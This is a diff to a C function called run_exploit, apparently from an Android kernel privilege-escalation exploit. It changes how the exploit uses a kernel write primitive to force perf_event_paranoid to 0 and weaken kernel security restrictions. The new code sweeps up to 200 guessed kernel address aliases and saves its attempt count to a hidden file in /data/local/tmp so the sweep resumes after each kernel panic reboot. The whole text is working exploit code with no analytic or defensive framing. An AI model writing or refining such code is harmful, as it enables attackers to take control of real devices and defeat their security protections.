@@ -941,13 +941,29 @@ int run_exploit(int argc, char **argv) {
   if (SELINUX_ENFORCING_OFF == 0) {
     pr_info("selinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1\n");
     if (SYSCTL_PERF_EVENT_PARANOID_OFF != 0) {
-      int one_shot = env_int_range("GL_ONE_SHOT", 0, 0, 1);
-      for (int att = 1; att <= (one_shot ? 1 : 2); att++) {
-        do_one_write_node(data_addr(SYSCTL_PERF_EVENT_PARANOID), "W1c: perf unblock", 1, 0);
-        usleep(100000);
+      /* v14 gear sweep: alias = TRUE_PAGE_OFFSET + m*1GB + 0x80000 + off.
+         m persists across panic reboots (.gl_round). */
+      for (int att = 1; att <= 200; att++) {
+        uintptr_t base = 0xffffffc000000000ULL
+                       + (uintptr_t)g_attempt_round * 0x40000000ULL
+                       + 0x80000ULL + SYSCTL_PERF_EVENT_PARANOID_OFF;
+        pr_info("W1c gear m=%zu target=%016zx\n", g_attempt_round, base);
+        do_one_write_node(base, "W1c: perf unblock", 1, 0);
+        usleep(150000);
         int pp = get_perf_paranoid();
-        pr_info("W1c attempt: perf_event_paranoid now = %d", pp);
-        if (pp == 0) { pr_success("perf_event_paranoid = 0"); break; }
+        pr_info("W1c gear m=%zu: perf now = %d\n", g_attempt_round, pp);
+        if (pp == 0) {
+          pr_success("perf_event_paranoid = 0 (gear %zu)\n", g_attempt_round);
+          break;
+        }
+        g_attempt_round++;
+        { /* bump the persisted round for panic-resume */
+          FILE *wf = fopen("/data/local/tmp/.gl_round", "w");
+          if (wf) {
+            fprintf(wf, "%zu", g_attempt_round);
+            fflush(wf); fsync(fileno(wf)); fclose(wf);
+          }
+        }
       }
     }
     selinux_ok = 1;
